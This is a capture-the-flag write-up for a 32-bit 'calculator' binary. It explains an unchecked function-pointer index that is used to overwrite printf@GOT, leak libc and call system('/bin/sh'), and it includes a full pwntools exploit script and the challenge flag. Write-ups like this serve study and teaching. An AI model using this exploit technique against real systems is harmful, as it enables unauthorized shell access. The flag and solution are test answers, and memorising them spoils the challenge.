---
author: Claude
credit: Claude, Fenix
---
## Challenge Overview

We're given a 32-bit C "calculator" binary that lets the user pick an arithmetic operation and two integers, then calls the selected function and prints the result.

```c
int (*operations[4])(int, int) = {add, subtract, multiply, divide};

int main() {
    int choice, a, b, res;
    // ...
    scanf("%d", &choice);
    scanf("%d %d", &a, &b);
    res = (*operations[choice-1])(a, b);
    printf("%d\n", res);
}
```

## Binary Protections

```
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
```

No PIE means all binary addresses are fixed. Partial RELRO means `.got.plt` is writable. Stack canary and NX prevent simple buffer overflow / shellcode approaches.

## The Vulnerability

There is **no bounds check** on `choice`. The expression `operations[choice-1]` performs an out-of-bounds read from the global `operations` array, then calls whatever address it reads as a function pointer with `(a, b)` as arguments.

Since `operations` is at a fixed address (`0x804c02c`) and the nearby `.got.plt` section (`0x804c000`) contains resolved libc function pointers, negative values of `choice` let us call **any GOT function** with fully controlled arguments.

## Memory Layout

```
0x804c000  .got.plt start
0x804c00c  __libc_start_main@GOT
0x804c010  printf@GOT              <- operations[-7]
0x804c014  __stack_chk_fail@GOT
0x804c018  puts@GOT                <- operations[-5]
0x804c01c  setvbuf@GOT
0x804c020  scanf@GOT               <- operations[-3]
0x804c024  .data start (writable)  <- operations[-2]
0x804c028  __dso_handle
0x804c02c  operations[0] = &add
0x804c030  operations[1] = &subtract
0x804c034  operations[2] = &multiply
0x804c038  operations[3] = &divide
```

Key OOB indices:
| choice | index | reads from | calls |
|--------|-------|------------|-------|
| -2 | -3 | `scanf@GOT` | `scanf(a, b)` |
| -4 | -5 | `puts@GOT` | `puts(a)` |
| -1 | -2 | `0x804c024` | whatever we write there |

## Exploitation Strategy

The core challenge is that we only get **one** function call per execution before `printf("%d\n", res)` runs and the program exits. We need to leak libc, compute addresses, and call `system("/bin/sh")` — that requires multiple interactions.

### The Loop Trick

The key insight is turning the single-shot vulnerability into a **reusable loop** within one connection by hijacking `printf@GOT`.

After the OOB call, main executes:

```asm
call   printf@plt          ; 0x80492dd — printf("%d\n", res)
add    $0x10,%esp           ; 0x80492e2 — cleanup
```

Meanwhile, the `printf("Enter your choice: ")` call earlier in main looks like:

```asm
call   printf@plt          ; 0x804926e — printf("Enter your choice: ")
add    $0x10,%esp           ; 0x8049273 — cleanup, then falls into scanf for choice
```

If we overwrite `printf@GOT` with `0x8049273` (the instruction right *after* the prompt printf), then every subsequent call to `printf@plt` will **jump directly into the scanf-for-choice code**, skipping the menu and the prompt printf entirely. This creates a loop:

```
call printf@plt  -->  jmp 0x8049273  -->  scanf(&choice)  -->  scanf(&a, &b)
     -->  operations[choice-1](a, b)  -->  call printf@plt  -->  jmp 0x8049273  -->  ...
```

Each iteration consumes only 4 extra bytes of stack (the return address pushed by `call` that never gets popped by `ret`), which is negligible.

### Four-Step Exploit

**Step 1: Create the loop** — Overwrite `printf@GOT` with `0x8049273`

```
choice = -2          (call scanf)
a      = 0x804a064   (format string "%d")
b      = 0x804c010   (printf@GOT)
stdin  → 134517363   (0x8049273 = LOOP_ADDR)
```

`scanf("%d", &printf_got)` writes our loop address into `printf@GOT`. When `printf("%d\n", res)` executes, it jumps to `0x8049273` and the program loops back to reading the next `choice`.

**Step 2: Leak libc** — Call `puts(scanf@GOT)`

```
choice = -4          (call puts)
a      = 0x804c020   (scanf@GOT — contains resolved libc address)
b      = 0            (ignored)
```

`puts` prints the raw bytes of `scanf`'s libc address. We parse the leak, subtract the known offset of `__isoc99_scanf`, and recover `libc_base`.

**Step 3: Write `system` to a data slot** — Arbitrary write via `scanf`

```
choice = -2          (call scanf)
a      = 0x804a064   ("%d")
b      = 0x804c024   (writable .data slot = operations[-2])
stdin  → system_addr  (libc_base + system_offset)
```

Now `operations[-2]` (at `0x804c024`) contains the address of `system`.

**Step 4: Call `system("/bin/sh")`**

```
choice = -1          (reads operations[-2] = system's address)
a      = binsh_addr  (libc_base + offset of "/bin/sh" string in libc)
b      = 0
```

This calls `system("/bin/sh")` and drops us into a shell.

## Exploit Code

```python
#!/usr/bin/env python3
from pwn import *
import sys

context.arch = 'i386'
context.bits = 32

PRINTF_GOT   = 0x804c010
SCANF_GOT    = 0x804c020
DATA_SLOT    = 0x804c024   # writable .data = operations[-2]
FMT_D        = 0x804a064   # "%d" in .rodata
LOOP_ADDR    = 0x8049273   # after printf("Enter your choice:") call

SCANF_CHOICE = -2   # operations[-3] = scanf@GOT
PUTS_CHOICE  = -4   # operations[-5] = puts@GOT
SLOT_CHOICE  = -1   # operations[-2] = DATA_SLOT

def to_signed(val):
    if val >= 0x80000000:
        return val - 0x100000000
    return val

p = remote('chal.bearcatctf.io', 11231)  # or process('./math_playground')
libc = ELF('./libc.so.6')                # matched to remote

scanf_offset  = libc.symbols['__isoc99_scanf']
system_offset = libc.symbols['system']
binsh_offset  = next(libc.search(b'/bin/sh'))

# Step 1: printf@GOT → LOOP_ADDR (create loop)
p.recvuntil(b"Enter your choice: ")
p.sendline(str(SCANF_CHOICE).encode())
p.recvuntil(b"Enter two integers:\n")
p.sendline(f"{to_signed(FMT_D)} {to_signed(PRINTF_GOT)}".encode())
p.sendline(str(to_signed(LOOP_ADDR)).encode())

# Step 2: Leak libc via puts(scanf@GOT)
p.sendline(str(PUTS_CHOICE).encode())
p.recvuntil(b"Enter two integers:\n")
p.sendline(f"{to_signed(SCANF_GOT)} 0".encode())
leak_bytes = p.recvline().rstrip(b'\n').ljust(4, b'\x00')
leaked_scanf = u32(leak_bytes[:4])

libc_base   = leaked_scanf - scanf_offset
system_addr = libc_base + system_offset
binsh_addr  = libc_base + binsh_offset

# Step 3: Write system addr to DATA_SLOT
p.sendline(str(SCANF_CHOICE).encode())
p.recvuntil(b"Enter two integers:\n")
p.sendline(f"{to_signed(FMT_D)} {to_signed(DATA_SLOT)}".encode())
p.sendline(str(to_signed(system_addr)).encode())

# Step 4: Call system("/bin/sh")
p.sendline(str(SLOT_CHOICE).encode())
p.recvuntil(b"Enter two integers:\n")
p.sendline(f"{to_signed(binsh_addr)} 0".encode())

p.interactive()
```

## Flag

```
BCCTF{y0U_mu57_r3411y_h473_maTH}
```
